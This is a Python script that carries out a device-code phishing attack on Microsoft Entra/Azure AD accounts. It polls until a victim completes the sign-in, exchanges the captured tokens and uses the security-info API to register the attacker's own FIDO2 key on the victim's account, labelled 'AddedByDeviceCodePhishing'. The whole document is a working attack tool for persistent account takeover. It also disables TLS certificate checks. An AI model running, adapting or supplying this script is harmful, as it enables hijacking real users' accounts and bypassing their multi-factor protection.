import requests
import json
import time
import re


# Adjust those two variables
bmp = "/home/user/Downloads/browsermob-proxy-2.1.4/bin/browsermob-proxy"
postHtmlFile = "/home/user/post.html"

requests.packages.urllib3.disable_warnings() 

# Init device code flow with ngcmfa (note this is performed on the "v1" oauth2 endpoint bcs I didn't figure out how to do it on the v2 endpoint)
headers = {
    'Host': 'login.microsoftonline.com',
    'Content-Type': 'application/x-www-form-urlencoded',
}

params = {
    'api-version': '1.0',
}

data = {
    'client_id': '00b41c95-dab0-4487-9791-b9d2c32c80f2',
    'resource': '0000000c-0000-0000-c000-000000000000',
    'amr_values': 'ngcmfa',
}

response = requests.post(
    'https://login.microsoftonline.com/common/oauth2/devicecode',
    params=params,
    headers=headers,
    data=data,
    verify=False,
)

response_flow_init = response.json()
response_flow_init_device_code = response_flow_init['device_code']
print(response_flow_init['message'])


# Complete device code flow. Get AccessToken and RefreshToken on the v1 oauth2 endpoint
data = 'resource=https://graph.microsoft.com&grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=00b41c95-dab0-4487-9791-b9d2c32c80f2&code=%s' % response_flow_init_device_code

# Looping, waiting for login
status = True
while status:
	response = requests.post(
    	'https://login.microsoftonline.com/common/oauth2/token',
    	params=params,
    	headers=headers,
    	data=data,
    	verify=False,
	)
	if (response.status_code != 200):
		print("[-] Status code not 200, will check in 5 seconds again.")
		time.sleep(5)
	else:
		response_device_code = response.json()
		response_device_code_refresh_token = response_device_code['refresh_token']
		print("[+] Login successful. Got tokens.")
		status = False

# Exchange the refresh token which was received from the v1 oauth2 endpoint on the v2 oauth2 endpoint. I was not able to use tokens from the v1 oauth2 endpoint on account.activedirectory.windowsazure.com.
data = 'client_id=00b41c95-dab0-4487-9791-b9d2c32c80f2&scope=0000000c-0000-0000-c000-000000000000/.default&refresh_token=%s&grant_type=refresh_token' % response_device_code_refresh_token
response = requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', headers=headers, data=data, verify=False)
response_refresh_dance = response.json()
access_token = response_refresh_dance['access_token']
print("[+] Exchanged refresh token for token which can be used at account.activedirectory.windowsazure.com")

#Get the required sessionCtx token from account.activedirectory.windowsazure.com
headers = {
    'Host': 'account.activedirectory.windowsazure.com',
    # 'Content-Length': '0',
    'Content-Type': 'application/json',
    'Authorization': 'Bearer %s' %access_token,
    'Connection': 'close',
}

response = requests.post(
    'https://account.activedirectory.windowsazure.com/securityinfo/Authorize',
    headers=headers,
    verify=False,
)

# Cleanup needed since the response is not valid JSON. Remove 5 characters before the character '{' from response and transform to valid JSON. 
clean_response = response.text[5:]
response_sessionCtx = json.loads(clean_response)
sessionCtx = response_sessionCtx['sessionCtx']
print("[+] Got sessionCtx")

# Init Fido2 key addition

headers = {
    'Host': 'account.activedirectory.windowsazure.com',
    # 'Content-Length': '11',
    'Sessionctx': '%s' % sessionCtx,
    'Authorization': 'Bearer %s' % access_token,
    'Content-Type': 'application/json',
    'Connection': 'close',
}

json_data = {
    'Type': 12,
}

response = requests.post(
    'https://account.activedirectory.windowsazure.com/securityinfo/AddSecurityInfo',
    headers=headers,
    json=json_data,
    verify=False,
)

# Cleanup needed since the response is not valid JSON. Remove 5 characters before the character '{' from response and transform to valid JSON. 
clean_response = response.text[5:]
response_fido_add = json.loads(clean_response)

response_fido_Data = json.loads(response_fido_add['Data'])
print("[+] Got provision data for fido")

provisionUrl = response_fido_Data['provisionUrl']
requestData = response_fido_Data['requestData']
canary = requestData['canary']
ExcludeNextGenCredentialsJSON = requestData['ExcludeNextGenCredentialsJSON']
serverChallenge = requestData['serverChallenge']
userId = requestData['userId']
userIconUrl = requestData['userIconUrl']
memberName = requestData['memberName']
userDisplayName = requestData['userDisplayName']
postBackUrl = requestData['postBackUrl']
authenticator = requestData['authenticator']

# create post.html file. This file is needed since I didn't figure out how to do a POST request via selenium. It's just a site which performs the needed POST request when the submit button is klicked.
file_html = open(postHtmlFile, "w")
file_html.write(f'''<html>
  <body>
    <form action="{provisionUrl}" method="POST">
      <input type="hidden" name="canary" value="{canary}" />
      <input type="hidden" name="ExcludeNextGenCredentialsJSON" value="{ExcludeNextGenCredentialsJSON}" />
      <input type="hidden" name="serverChallenge" value="{serverChallenge}" />
      <input type="hidden" name="userId" value="{userId}" />
      <input type="hidden" name="userIconUrl" value="{userIconUrl}" />
      <input type="hidden" name="memberName" value="{memberName}" />
      <input type="hidden" name="userDisplayName" value="{userDisplayName}" />
      <input type="hidden" name="postBackUrl" value="{postBackUrl}" />
      <input type="hidden" name="authenticator" value="{authenticator}" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
''')
file_html.close()

# To read response bodies browsermobproxy is used.
from browsermobproxy import Server
server = Server(bmp)
server.start()
proxy = server.create_proxy()

#Init selenium
from selenium import webdriver 
from selenium.webdriver.chrome.service import Service as ChromeService 
from webdriver_manager.chrome import ChromeDriverManager 
 
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % proxy.proxy)
chrome_options.add_argument('ignore-certificate-errors')
driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()),options=chrome_options)

#define har file capture data
proxy.new_har("capturedHAR", options={'captureHeaders': True, 'captureContent': True, 'captureBinaryContent': True})

url = "file://" + postHtmlFile 
driver.get(url)
input("Press Enter to continue after you added your fido key...")
print("[-] Searching responses for attestation object")

proxy.har

#parsing proxy.har file for attestationobject
for ent in proxy.har['log']['entries']:
  _url = ent['request']['url']
  _response = ent['response']
  if 'text' in ent['response']['content']:
   data = _response['content']['text']
   if "function validateData()"  in data:
     regex = r'{"AttestationObject":".*}'
     match = re.search(regex, data)
     if match:
     	substring = match.group()
     	attestation = json.loads(substring)
     	attestation.update({"name":"AddedByDeviceCodePhishing"})
     	attestation.update({"PostInfo":""})
     	print("[+] Attestation object found")

# Finall call to save the fido key with a name

json_data = {
    'Type': 12,
    'VerificationData': '%s' % attestation,
}

response = requests.post(
    'https://account.activedirectory.windowsazure.com/securityinfo/VerifySecurityInfo',
    headers=headers,
    json=json_data,
    verify=False,
)

print(response.text)

print("[+] End...try to login with your fido key :)")
